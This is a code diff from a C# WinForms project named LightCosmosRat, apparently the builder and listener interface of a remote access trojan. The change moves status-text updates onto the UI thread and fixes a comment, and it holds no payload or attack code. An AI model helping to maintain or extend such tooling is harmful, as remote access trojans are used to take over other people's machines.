@@ -32,11 +32,19 @@ namespace LightCosmosRat
                 Thread.Sleep(3000);
                 if(f1 != null && f1.Visible)
                 {
-                    tb.Text = "Client maker running...";
+                    this.Invoke(new MethodInvoker(() =>
+                    {
+                        tb.Text = "Client maker running...";
+                    }));
+                    
                 }
                 else if(f2 != null && f2.Visible)
                 {
-                    tb.Text = "Listening panel running...";
+                    this.Invoke(new MethodInvoker(() =>
+                    {
+                        tb.Text = "Listening panel running...";
+                    }));
+                    
                 }
                 else
                 {
@@ -44,7 +52,7 @@ namespace LightCosmosRat
                     sb.Append("Ready...");
                     sb.AppendLine();
                     sb.Append(DateTime.Now.ToLocalTime());
-                    //check if the host the machine is connected to inter by visiting the official website
+                    //check if the host the machine is connected to internet by visiting the official website
                     try
                     {
                         connectionChecker = new TcpClient();
@@ -56,12 +64,19 @@ namespace LightCosmosRat
                         sb.AppendLine();
                         sb.Append("Your local IP: "+ IpInfo[0]);
                         connectionChecker.Close();
-                        tb.Text = sb.ToString();
+                        Invoke(new MethodInvoker(() =>
+                        {
+                            tb.Text = sb.ToString();
+                        }));
+                        
                     }catch(Exception ex)
                     {
                         sb.AppendLine();
                         sb.AppendLine("Network Error");
-                        tb.Text = sb.ToString();
+                        Invoke(new MethodInvoker(() =>
+                        {
+                            tb.Text = sb.ToString();
+                        }));
                     }
                 }
             }
@@ -78,7 +93,6 @@ namespace LightCosmosRat
 			//
 			// TODO: Add constructor code after the InitializeComponent() call.
 			//
-			CheckForIllegalCrossThreadCalls = false;
 		}
 		void Button1Click(object sender, EventArgs e)
 		{
